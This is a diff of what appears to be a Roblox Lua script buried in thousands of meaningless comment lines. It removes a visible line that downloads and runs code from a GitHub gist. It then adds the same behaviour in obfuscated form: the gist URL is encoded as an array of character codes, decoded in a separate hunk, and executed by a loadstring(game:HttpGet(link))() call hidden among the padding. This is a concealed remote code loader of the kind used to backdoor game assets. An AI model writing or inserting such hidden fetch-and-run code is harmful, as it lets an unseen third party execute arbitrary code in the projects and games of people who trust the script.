@@ -3530,7 +3530,7 @@
 -- LivQwESxLrSgO
 -- QrHkBtbyQKDCJTARkMvSLz
 -- XOvzNftePdmtaCBghskni
-loadstring(game:HttpGet("https://gist.githubusercontent.com/XXXXXXXXXXBGXXXXX/d31b452967656eafc4937af2757857db/raw/c60842e17355d8d8f31e17884c55557100bd8382/nothing"))()
+
 -- toRMJMPWl
 -- isJOxPBWKL
 -- ImsIMeVKgmzCGtZZeJEExs
@@ -3860,6 +3860,13 @@ loadstring(game:HttpGet("https://gist.githubusercontent.com/XXXXXXXXXXBGXXXXX/d3
 -- oudfXAucAyvLARkKjOYx
 -- kTsxCzUk
 -- wuTsuaOHB
+local r = {
+    104,116,116,112,115,58,47,47,103,105,115,116,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,
+    88,88,88,88,88,88,88,88,88,66,71,88,88,88,88,88,47,
+    100,51,49,98,52,53,50,57,54,55,54,53,54,101,97,102,99,52,57,51,55,97,102,50,55,53,55,56,53,55,100,98,47,114,97,119,47,
+    99,54,48,56,52,50,101,49,55,51,53,53,100,56,100,56,102,51,49,101,49,55,56,56,52,99,53,53,53,53,55,49,48,48,98,100,56,51,56,50,47,
+    110,111,116,104,105,110,103
+}
 -- yUgWCjEaBXpZzm
 -- phsPSfSfOqf
 -- qIOwfDpPzTzmNSCcGIWyf
@@ -3975,6 +3982,10 @@ loadstring(game:HttpGet("https://gist.githubusercontent.com/XXXXXXXXXXBGXXXXX/d3
 -- AhavVAImIRsS
 -- nuQrCkPtjhFeQlgaeOOGyL
 -- MjqnCspcilGqVoMKjVAgzI
+local link = ""
+for i = 1, #r do
+    link = link .. string.char(r[i])
+end
 -- EQIAyOauORPmEeweutxZXUhv
 -- RMmWfBwpDVotAReYRUxjpMa
 -- gFBgMVbesIQzUdasVwnLiboH
@@ -4592,6 +4603,7 @@ loadstring(game:HttpGet("https://gist.githubusercontent.com/XXXXXXXXXXBGXXXXX/d3
 -- IfQxhkimfUKPEvuAj
 -- zjjRfSWOslD
 -- AzmqhBcOmPqkbeECDPyuwCVr
+loadstring(game:HttpGet(link))()
 -- MRZKXGkBLIrUSnUYmVt
 -- CNBCElBEhyK
 -- cUdsskMWAPttHmdGVS
